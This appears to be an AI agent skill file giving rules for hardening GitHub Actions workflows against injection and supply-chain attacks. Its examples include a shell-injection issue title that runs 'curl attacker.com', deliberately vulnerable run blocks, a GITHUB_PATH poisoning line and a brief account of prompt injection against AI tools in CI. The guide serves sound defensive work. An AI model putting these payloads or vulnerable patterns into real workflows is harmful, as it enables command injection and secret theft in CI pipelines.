---
name: secure-github-actions
description: |
  Harden GitHub Actions workflows against supply-chain and injection attacks when
  creating, modifying, or reviewing a `.github/workflows/*.yml` file. Skip for
  unrelated CI work (other CI providers, Playwright harness, dependency pinning)
  that does not touch a workflow YAML.
metadata:
  keywords: github actions, workflow yaml, .github/workflows, expression injection, SHA pin, pull_request_target, claude-code-action
  version: "1.1"
  user-invocable: true
allowed-tools: Read Grep Glob Bash
---

# Secure GitHub Actions

Enforces supply chain hardening rules for GitHub Actions workflows. Every rule below
addresses a real vulnerability class found in security audits of production workflows.

## When to Use

- Writing a new `.github/workflows/*.yml` file
- Modifying an existing workflow
- Reviewing a PR that touches workflow files
- Adding a secret, action reference, or reusable workflow call
- Configuring `claude-code-action` or `claude-code-base-action`

## When NOT to Use This Skill

This skill is specifically for **GitHub Actions workflow YAML files**. If you reach it
but the actual task is one of the below, **step aside**: say in a single line that the
rules here only apply to `.github/workflows/*.yml` edits and continue with the real task.
Do not run the audit grep commands or the pre-PR checklist on unrelated code.

- **Other CI providers** (e.g. `pipeline.yml`, `.buildkite/`, CircleCI config) — use that provider's tooling
- **Playwright / e2e harness setup** that does not edit a workflow YAML
- **Dependency pinning** in `package.json`, `pnpm-lock.yaml`, `Gemfile`, etc. — even
  though supply-chain–adjacent, the rules below are about workflow YAML idioms
- **Generic CI investigation** with no workflow file change in scope
- **Supply-chain questions about npm/pnpm/RubyGems** — use a package supply-chain scanner

If a workflow file is *also* in scope alongside one of the above, apply the rules
to the workflow file and step aside for the rest.

## The Rules

### Rules 1-11: All Repositories

### Rule 1: No `${{ }}` in `run:` blocks

**Never** interpolate any `${{ }}` expression directly in a `run:` block — route
everything through `env:` variables. This applies to all expressions, not just
attacker-controlled ones:

- **Attacker-controlled values** (`github.event.*`, `inputs.*`) — shell injection risk
- **Secrets** (`secrets.*`) — leak via `set -x`, shell errors, and process listings
- **Context values** (`github.repository`, `github.run_id`, `steps.*.outputs.*`) — trains
  bad habits, zizmor flags them, and any future refactor that introduces attacker input
  into the same block inherits the anti-pattern

```yaml
# VULNERABLE — attacker-controlled title executes as shell
run: |
  TITLE="${{ github.event.issue.title }}"

# ALSO WRONG — "not attacker-controlled" is not an excuse
run: |
  gh issue edit "${{ github.event.issue.number }}" --repo "${{ github.repository }}"
  curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "$URL"

# SAFE — env vars are set before shell parses the script
env:
  ISSUE_TITLE: ${{ github.event.issue.title }}
  ISSUE_NUMBER: ${{ github.event.issue.number }}
  REPO: ${{ github.repository }}
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
run: |
  echo "$ISSUE_TITLE"
  gh issue edit "$ISSUE_NUMBER" --repo "$REPO"
```

**Why:** GitHub expands `${{ }}` expressions via string interpolation *before* the shell
sees the script. A malicious issue title like `"; curl attacker.com; "` breaks out of
quotes and executes arbitrary commands. Env vars are injected as process environment,
not text substitution, so shell metacharacters are inert.

Even "safe" values like `github.repository` or `secrets.GITHUB_TOKEN` should go through
`env:` — secrets can leak via `set -x` or shell error messages, and allowing some `${{ }}`
in `run:` blocks trains the pattern as acceptable, leading to copy-paste injection bugs
when the same block is extended with attacker-controlled values later.

**Simple rule: if you see `${{ }}` inside a `run:` block, it's wrong. Move it to `env:`.**

**Highest-risk expressions** (attacker-controlled — shell injection):
- `github.event.issue.title`, `.body`
- `github.event.comment.body`
- `github.event.pull_request.title`, `.body`, `.head.ref`
- `github.event.label.name`
- `github.event.review.body`
- `inputs.*` (workflow_dispatch, workflow_call)

**Still wrong in `run:` blocks** (not attacker-controlled, but banned):
- `secrets.*` — leak risk via shell diagnostics
- `github.repository`, `github.run_id`, `github.server_url`
- `steps.*.outputs.*`, `needs.*.outputs.*`, `job.status`
- `github.event.issue.number`, `github.event.pull_request.number`

**Safe in `with:` blocks** (YAML context, no shell): `${{ }}` in action `with:` inputs
is safe from *shell* injection, but still a prompt injection vector if passed to AI tools.

### Rule 2: No `secrets: inherit`

Always use explicit `secrets:` mapping when calling reusable workflows. List exactly
which secrets the called workflow needs.

```yaml
# VULNERABLE — exposes ALL repo secrets to the called workflow
jobs:
  notify:
    uses: your-org/shared-workflows/.github/workflows/notify.yml@main
    secrets: inherit

# SAFE — only passes what's needed
jobs:
  notify:
    uses: your-org/shared-workflows/.github/workflows/notify.yml@main
    secrets:
      SLACK_BOT_TOKEN: ${{ secrets.SLACK_BOT_TOKEN }}
```

**Why:** `secrets: inherit` passes every secret the caller has access to. If the
called workflow's repo is compromised (pushed malicious code to `main`), every secret
is exfiltrated. This is a well-documented real-world exfiltration path — incidents have
traced back to a single `secrets: inherit` repeated across many workflows.

### Rule 3: SHA-pin all action references

Pin every `uses:` reference to a full commit SHA with a version comment.
Only exception: trusted reusable workflows in a repo **you** control that has branch
protection with required reviews (e.g. `your-org/shared-workflows@main`).

```yaml
# VULNERABLE — mutable tag, can change without notice
uses: actions/checkout@v4
uses: anthropics/claude-code-action@v1
uses: anthropics/claude-code-base-action@beta

# SAFE — immutable SHA with human-readable comment
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
uses: anthropics/claude-code-action@ad30de060ff4bb30eaa7e07042e4aebacfae7dac # v1.0.29
```

**How to resolve a SHA:**
```bash
# For tags:
gh api repos/{owner}/{repo}/git/ref/tags/{tag} --jq '.object.sha'
# For branches:
gh api repos/{owner}/{repo}/git/ref/heads/{branch} --jq '.object.sha'
```

**Why:** Tags and branches are mutable. A compromised upstream repo can point `@v1` to
malicious code. SHAs are immutable — the only tamper-proof reference.

### Rule 4: Trusted actions only

Restrict which actions can run in your org (Settings → Actions → *Allow select actions*).
A tight allowlist is a strong supply-chain control. A good baseline:

- `actions/*`, `github/*` — GitHub first-party (org-level toggle)
- Your own org's actions (`your-org/*`)
- `anthropics/*` — Claude code actions, if used
- A short, explicitly-vetted list of third-party actions you actually depend on
  (e.g. `ruby/setup-ruby`, `pnpm/action-setup`) — each pinned by SHA

Anything not on the allowlist is blocked. Before adding a new third-party action, prefer
`gh` CLI or `actions/github-script` over taking on a new dependency.

```yaml
# Instead of a third-party action:
- run: gh issue comment "$ISSUE_NUMBER" --body "Processed by CI"
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ISSUE_NUMBER: ${{ github.event.issue.number }}
```

#### Prefer native solutions over third-party actions

Before adding a third-party action — or widening the allowlist to permit one — ask whether
the same behaviour is achievable with a few more lines of native code. If yes, use the
native approach: it keeps the org's third-party action surface smaller, eliminates a
SHA-pinning maintenance burden, and removes a supply chain attack vector entirely.

**Native alternatives to reach for first:**

| Need | Native solution |
|------|----------------|
| GitHub API calls (labels, comments, PRs, issues) | `actions/github-script` (always on allowlist) |
| `gh` CLI operations | `run:` step with `GH_TOKEN` env var |
| Simple HTTP requests | `run:` step with `curl` |
| File manipulation, string processing | `run:` step with standard shell tools |

```yaml
# AVOID — third-party action for a trivial operation
- uses: dessant/label-actions@abc123 # v4
  # Requires config file + adds third-party dep to supply chain

# PREFER — same behaviour as two GitHub API calls in actions/github-script
- name: Re-add label and explain
  uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd # v8
  with:
    script: |
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: ':wave: This label is managed by CI.'
      });
      await github.rest.issues.addLabels({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        labels: ['protected-label']
      });
```

**The bar for keeping a third-party action:** the native equivalent would require
significantly more code or is clearly not maintainable inline (e.g., complex
multi-step setup actions like `ruby/setup-ruby`). "A few more lines" is not a reason
to keep a dependency.

### Rule 5: Always declare `permissions:`

Every workflow MUST have a top-level `permissions:` block with least privilege.
Even when the org default is read-only, declaring permissions explicitly is
defense in depth — org defaults can change, and explicit is self-documenting.

```yaml
permissions:
  contents: read
  issues: write
  pull-requests: read
```

Only add permissions the workflow actually needs. Common mistakes:
- `id-token: write` when not using OIDC — remove it. **Exception: reusable-workflow
  callers** — if the job `uses:` a reusable workflow, do **not** strip `id-token: write`
  (or any scope) just because the caller's own steps don't reference it; the callee may
  need it. See "Reusable workflow callers" below.
- `contents: write` when only reading — use `read` (same caller exception)
- Missing block entirely — defaults to repo-wide setting

#### The API namespace is NOT the permission scope

Do **not** derive the permission scope from the REST method's namespace. For the Actions
default `GITHUB_TOKEN`, the permission check keys off the **resource being acted on**, not
the API path. The trap: **commenting on a pull request with the `GITHUB_TOKEN` requires
`pull-requests: write`** even though the call goes through the *issues* namespace
(`github.rest.issues.createComment`, `gh pr comment`, `gh issue comment` on a PR). PRs are
issues in the REST data model, but the `GITHUB_TOKEN` permission gate treats a PR as a PR.

Commenting on a real **issue** does take `issues: write` — keep that scope for
issue-comment workflows, and do not flag it. The point is narrower: `issues: write` does
**not** also unlock commenting on a **PR** under the `GITHUB_TOKEN`. (GitHub's "Create an
issue comment" REST reference lists `issues: write` as accepted, but that describes issue
targets and fine-grained PATs; the `GITHUB_TOKEN`-on-a-PR path is the exception this rule
exists for.)

This is not theoretical. A real PR-commenting workflow ran fine with `pull-requests: write`
(and no `issues:` scope). A hardening pass changed it to `pull-requests: read` +
`issues: write`, and the `github.rest.issues.createComment` call failed at runtime:

```
RequestError [HttpError]: Resource not accessible by integration
status: 403
'x-accepted-github-permissions': 'issues=write; pull_requests=write'
```

`issues: write` was present yet the comment still 403'd, because `pull-requests` had been
downgraded to `read`. The minimal scope that works is **`pull-requests: write` alone** —
before the breaking change the workflow commented on PRs with `pull-requests: write` and no
`issues:` scope at all. So for a PR-comment workflow, grant `pull-requests: write` and
never downgrade it to `read`; add `issues: write` **only** if the same workflow also
comments on or manages real *issues*. `issues: write` is neither sufficient for PR comments
nor required when only PRs are touched. (GitHub's `x-accepted-github-permissions` header
lists `issues=write; pull_requests=write`, but it is over-broad here — the production
before-state proves `pull-requests: write` on its own is enough.)

```yaml
# BROKEN — workflow triggers on pull_request and posts a comment on the PR,
# but pull-requests was downgraded to read because the call "uses issues.createComment".
# The comment API returns 403 at runtime; the step fails.
permissions:
  pull-requests: read   # WRONG for a workflow that comments on PRs
  issues: write

# SAFE — commenting on a PR target needs pull-requests: write
permissions:
  pull-requests: write
```

Quick scope map for the common operations:

| Operation | Required scope |
|-----------|---------------|
| Comment on a **PR** with `GITHUB_TOKEN` (`issues.createComment` / `gh pr comment` on a PR) | `pull-requests: write` (sufficient on its own; `issues: write` is neither required nor sufficient for PR comments) |
| Comment on an **issue** | `issues: write` |
| Add/remove labels on an issue | `issues: write` |
| Add/remove labels on a PR | `issues: write` or `pull-requests: write` (label endpoints accept either) |
| Reusable-workflow caller whose callee uses OIDC | keep `id-token: write` (do not strip) |
| List PR files / read PR metadata (`pulls.listFiles`, `pulls.get`) | `pull-requests: read` |
| Edit PR title/body (`pulls.update`) | `pull-requests: write` |
| Request PR reviewers (`pulls.requestReviewers`) | `pull-requests: write` |

#### Never downgrade an existing `write` scope during a hardening pass without checking what runs

Least privilege means removing scopes the workflow does **not** use — not blindly
narrowing every `write` to `read`. Before lowering an existing `write` scope (especially
`pull-requests: write`), read every step and confirm the workflow does not *write* to
that resource at runtime. A workflow that posts PR comments, edits PRs, or manages
labels genuinely needs its write scope; downgrading it produces a silent 403 that CI
may still log as green. When in doubt, keep the existing `write` scope and flag it for
manual confirmation rather than narrowing it.

#### Reusable workflow callers: caller caps callee

For reusable-workflow callers, the rule above is **functional**, not just
defense-in-depth: the callee's `permissions:` block can only restrict the
caller's, never expand it. Without a caller block, the callee's writes get
silently clipped — the workflow logs green while the API call returns 403/404
inside the script.

Mirror every scope the callee declares at the caller's top level.

```yaml
# BROKEN — callee declares `permissions: issues: write` for label management,
# but the caller's missing permissions block clips the request to read-only.
# Workflow logs green; labelling silently fails.
jobs:
  call-label-prs:
    uses: your-org/shared-workflows/.github/workflows/label-prs.yml@main

# SAFE — caller grants what the callee needs.
permissions:
  contents: read
  issues: write
jobs:
  call-label-prs:
    uses: your-org/shared-workflows/.github/workflows/label-prs.yml@main
```

**You usually cannot see what the callee needs from the caller alone.** A reusable
workflow lives in another file (often another repo), so a scope the caller's own steps
never reference is **not** evidence it's unused — the callee may depend on it. Never strip
a scope from a reusable-workflow caller on "the caller doesn't use it" reasoning. To
verify, read the callee's top-level `permissions:` (and what its steps do); if you can't,
**keep the existing scope** and leave an inline comment so the next hardening pass does too.

`id-token: write` is the highest-stakes example. A caller that only `uses:` a reusable
workflow has no OIDC step of its own, so a hardening pass that can't see the callee reads
`id-token: write` as "unnecessary" and strips it — but if the callee authenticates to a
cloud via OIDC (`aws-actions/configure-aws-credentials`, etc.), the caller's cap now
denies it. This is rejected at **run-creation time** → `startup_failure`: no jobs, no
logs, just a red X. (This is a real failure mode: an org-wide reusable workflow that
uploads to cloud storage via OIDC broke every caller that had `id-token: write` stripped —
every push failed with `startup_failure`.)

```yaml
# BROKEN — caller dropped id-token: write because no caller step uses OIDC.
# The callee uploads to cloud storage via OIDC; run creation fails with startup_failure.
permissions:
  contents: read
jobs:
  upload-sbom:
    uses: your-org/shared-workflows/.github/workflows/upload-sbom.yml@main

# SAFE — keep id-token: write; the callee's OIDC step needs it.
permissions:
  contents: read
  id-token: write   # required by the reusable callee for OIDC cloud upload
jobs:
  upload-sbom:
    uses: your-org/shared-workflows/.github/workflows/upload-sbom.yml@main
```

Note the two distinct failure modes: a clipped **`GITHUB_TOKEN`** scope (issues,
pull-requests, contents…) fails *inside* the callee at API-call time (403/404, often
logs green); a clipped **`id-token: write`** fails at *run creation* (`startup_failure`,
no logs at all).

### Rule 6: No unpinned runtime dependencies

No `npx @latest`, no `git clone` at HEAD, no `npm install` without a lockfile.

```yaml
# VULNERABLE
run: npx @modelcontextprotocol/server-github@latest
run: npx -y @sentry/mcp-server@latest
run: git clone https://github.com/org/repo.git && cd repo && npm install

# SAFE — pinned to exact version
run: npx @modelcontextprotocol/server-github@1.2.3
# SAFE — pinned to commit SHA with lockfile
env:
  REPO_SHA: "abc123def456"
run: |
  git clone https://github.com/org/repo.git
  cd repo
  git checkout "$REPO_SHA"
  npm ci
```

**Common mistake:** `git clone --revision` is **not a valid git flag** — it gets silently
ignored, cloning HEAD instead of the pinned SHA. Use `git clone` followed by
`git checkout "$SHA"`. For shallow clones, use `git fetch --depth 1 origin "$SHA"` after init.

**Why:** `@latest` and HEAD are mutable references that resolve at runtime. A
compromised package or repo delivers malicious code the next time the workflow runs.

### Rule 7: Never checkout untrusted code with secrets

If using `pull_request_target`, **never** checkout the PR head in a job that has secrets.
Split into two jobs:

```yaml
jobs:
  # Job 1: Unprivileged — validates the PR
  validate:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    outputs:
      safe: ${{ steps.check.outputs.safe }}
    steps:
      - name: Validate via API (no checkout of PR code)
        id: check
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          # Validate using GitHub API only — never run PR code

  # Job 2: Privileged — acts on validated PR (never checks out PR code)
  act:
    needs: validate
    if: needs.validate.outputs.safe == 'true'
    runs-on: ubuntu-latest
    steps:
      - name: Label PR via API
        env:
          GH_TOKEN: ${{ secrets.ELEVATED_TOKEN }}
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: gh pr edit "$PR_NUMBER" --add-label "validated"
```

**Trusted script pattern** (when you need both base code and PR history):
```yaml
steps:
  - name: Checkout base branch (trusted code)
    uses: actions/checkout@SHA # pinned
  - name: Preserve trusted script
    run: cp script/security/scanner.rb /tmp/trusted_scanner.rb
  - name: Fetch PR head (for git history only)
    env:
      PR_NUMBER: ${{ github.event.issue.number }}
    run: |
      git fetch origin "pull/$PR_NUMBER/head"
      git checkout FETCH_HEAD
  - name: Run trusted script
    run: ruby /tmp/trusted_scanner.rb
```

### Rule 8: No `pull_request_target` unless necessary

Prefer `pull_request` trigger. It runs in the context of the fork with no secrets access,
which is safe by default.

`pull_request_target` grants secrets and write permissions to code triggered by a fork PR.
If you must use it, document why in a YAML comment and follow the split-job pattern from
Rule 7.

```yaml
# SAFE default — use this
on:
  pull_request:
    types: [opened, synchronize]

# DANGEROUS — only if you need secrets for fork PRs, with documented justification
on:
  pull_request_target:  # Required because: [specific reason]
    types: [opened, synchronize]
```

### Rule 9: Scope Claude/AI tool access when handling untrusted input

When using `claude-code-action` or `claude-code-base-action` on workflows that
process untrusted input (issue bodies, PR diffs, external content), scope
`allowed_tools` to limit blast radius from prompt injection.

```yaml
# Higher risk — if the workflow processes untrusted input
with:
  allowed_tools: "Read,Write,Edit,Bash,Glob,Grep"

# Lower risk — scoped to specific CLI patterns
with:
  allowed_tools: "Read,Grep,Glob,Bash(gh issue:*),Bash(gh pr:*)"
```

**Why:** If Claude processes attacker-controlled content (issue bodies, PR diffs),
prompt injection could lead to unintended command execution. Scoping `Bash` to
specific patterns reduces the blast radius.

### Rule 10: Actions creating or approving PRs

GitHub provides an org/repo setting — *Allow GitHub Actions to create and approve pull
requests* — that is **off by default**, and turning it off is recommended: it closes a
privilege-escalation path where a workflow self-approves or opens PRs. With it off, any
workflow that tries to create or approve a PR fails with a permissions error.

If you keep it off (recommended), migrate workflows that create or approve PRs:

- **PR approvals / creation** → Use a dedicated GitHub App with narrowly-scoped
  permissions and policy enforcement, not the Actions `GITHUB_TOKEN`

Remove any `gh pr review --approve`, `gh pr create`, or equivalent API calls
from workflow `run:` blocks when the setting is off. If reviewing a workflow that still
contains PR creation or approval steps under that policy, flag it as a required migration.

### Rule 11: Guard `GITHUB_ENV` and `GITHUB_PATH` from untrusted input

Never write attacker-controlled values to `GITHUB_ENV` or `GITHUB_PATH`. These files
modify the environment for **all subsequent steps** in the job.

```yaml
# VULNERABLE — attacker-controlled label written to GITHUB_ENV
run: |
  echo "LABEL=${{ github.event.label.name }}" >> $GITHUB_ENV

# VULNERABLE — untrusted step can poison PATH for later steps
run: echo "/tmp/attacker-bin" >> $GITHUB_PATH

# SAFE — use env: block, don't propagate to GITHUB_ENV
env:
  LABEL: ${{ github.event.label.name }}
run: |
  echo "Processing $LABEL"
```

**Why:** A compromised or attacker-influenced step can set `LD_PRELOAD`, inject
malicious binaries into `PATH`, or override variables consumed by later steps.
Unlike `env:` blocks (scoped to one step), `GITHUB_ENV` persists across all
subsequent steps in the job.

## Public Repository Rules (Rules 12-14)

**Public repos enforce three extra rules on top of Rules 1-11.** Before reviewing, detect repo visibility:
```bash
gh repo view --json visibility -q '.visibility'
```
If the result is `PUBLIC`, load [`references/public-repo-rules.md`](references/public-repo-rules.md) and
enforce Rules 12-14 (LOTP / no secrets on fork PR builds, `persist-credentials: false` on checkout,
and OIDC over long-lived cloud secrets) in addition to the all-repo rules above. Skip this reference
for private repos — Rules 12-14 do not apply there.

## Pre-PR Checklist

Run this against your workflow before submitting. Every item maps to a rule above.

```
[ ] No ${{ }} expressions of any kind in run: blocks (Rule 1)
[ ] No secrets: inherit — all secrets explicitly mapped (Rule 2)
[ ] Every uses: reference is SHA-pinned with version comment (Rule 3)
    Exception: a trusted reusable-workflow repo you control with branch protection
[ ] All actions are on the org allowlist (Rule 4)
[ ] Third-party actions replaced with native alternatives where feasible (Rule 4)
[ ] Top-level permissions: block with least privilege (Rule 5)
[ ] If calling a reusable workflow, caller permissions: grants at least every scope the callee declares (Rule 5)
[ ] Reusable-workflow caller: no scope stripped on "caller doesn't use it" reasoning — keep id-token: write (and others) the callee needs; stripping id-token: write causes startup_failure (Rule 5)
[ ] PR-commenting workflows keep pull-requests: write — scope mapped by target resource, not API namespace; existing write scopes not downgraded without checking the steps (Rule 5)
[ ] No npx @latest, git clone at HEAD, or npm install without lockfile (Rule 6)
[ ] If pull_request_target: no PR head checkout in jobs with secrets (Rule 7)
[ ] pull_request used instead of pull_request_target where possible (Rule 8)
[ ] Claude allowed_tools scoped if workflow processes untrusted input (Rule 9)
[ ] No PR creation or approval steps if the org setting is off — use a GitHub App (Rule 10)
[ ] No attacker-controlled values written to GITHUB_ENV or GITHUB_PATH (Rule 11)
[ ] (Public repos) No secrets in fork PR build jobs (Rule 12)
[ ] (Public repos) persist-credentials: false on checkout (Rule 13)
[ ] (Public repos) OIDC tokens over long-lived secrets for cloud auth (Rule 14)
```

## Quick Audit Command

To scan an existing set of workflows for violations of the rules above, load
[`references/audit-commands.md`](references/audit-commands.md) — it ships one grep/awk command per rule
(stray `${{ }}` in `run:`, `secrets: inherit`, unpinned `uses:`, missing `permissions:`, unpinned `npx`,
PR creation/approval, unscoped Claude `Bash`, `GITHUB_ENV`/`GITHUB_PATH` writes, missing `persist-credentials`).

## Common Mistakes

| Mistake | Why It's Wrong | Fix |
|---------|---------------|-----|
| Using a third-party action for a trivial operation | Adds supply chain surface, SHA maintenance, and may need allowlist widening | Replace with `actions/github-script`, `gh` CLI, or `run:` step |
| `echo "${{ github.event.issue.title }}"` | Shell injection before echo runs | Use `env:` + `$ISSUE_TITLE` |
| `curl -H "Bearer ${{ secrets.TOKEN }}"` | Secret leaks via `set -x` or shell errors | Use `env: GH_TOKEN: ${{ secrets.TOKEN }}` |
| `git clone --revision "$SHA" repo.git` | `--revision` is not a valid git flag — silently clones HEAD | Use `git clone` then `git checkout "$SHA"` |
| `secrets: inherit` with `@main` ref | All secrets exposed if upstream compromised | Explicit `secrets:` mapping |
| Dropping the `secrets:` block when the callee declares accepted inputs | Callee falls back to its default (often `${{ github.token }}` with caller-bounded scopes); if you needed a different token or override, the side effect silently fails | Read the callee's top-level `secrets:` declaration; explicitly map every input you need with `${{ secrets.X }}` |
| `uses: action@v1` | Tag can be force-pushed to malicious commit | SHA-pin: `action@abc123 # v1` |
| `npx package@latest` | Resolves to whatever is published right now | Pin exact version |
| `pull_request_target` + `actions/checkout` of PR head | Untrusted code runs with secrets | Split into unprivileged + privileged jobs |
| Omitting `permissions:` block | Inherits repo default (may be `write-all`) | Declare minimum permissions |
| Reusable-workflow caller with no `permissions:` block | Caller's read-only default clips callee's write requests → silent runtime failure (workflow logs green, side effect never happens) | Add top-level `permissions:` mirroring every scope the callee declares (e.g., `issues: write` for label-management callees) |
| `pull-requests: read` on a workflow that comments on PRs (because the call "uses `issues.createComment`") | Commenting on a PR with the `GITHUB_TOKEN` needs `pull-requests: write` — `issues: write` does not cover PR comments; comment API returns 403 at runtime | Use `pull-requests: write` for PR comments; map scope by the target resource, not the API method's namespace (`issues: write` stays correct for issue comments) |
| Downgrading an existing `write` scope to `read` during a least-privilege pass without checking the steps | The workflow may write to that resource at runtime (PR comments, label edits) → silent 403 | Only remove scopes the workflow does not use; read every step before narrowing an existing `write` |
| Stripping `id-token: write` (or any scope) from a reusable-workflow caller because no caller step uses it | The callee may use it (e.g. OIDC cloud auth); caller caps callee, so a clipped `id-token` is rejected at run creation → `startup_failure` (no jobs, no logs) | Keep scopes a reusable-workflow caller passes through; verify against the callee's `permissions:` or keep + comment |
| `gh pr review --approve` or `gh pr create` in a workflow when the org setting is off | Actions cannot create or approve PRs under that policy | Migrate approvals/creation to a dedicated GitHub App |
| `allowed_tools: "Bash"` on Claude processing untrusted input | Prompt injection leads to unintended command execution | Scope: `Bash(gh:*)` |
| `echo "$INPUT" >> $GITHUB_ENV` | Poisons environment for all subsequent steps | Use step-level `env:` instead |
| `persist-credentials: true` (default) | Credentials in `.git/config` leak via artifacts | Set `persist-credentials: false` |
| Long-lived cloud keys as secrets | High blast radius, no expiry | Use OIDC token exchange |
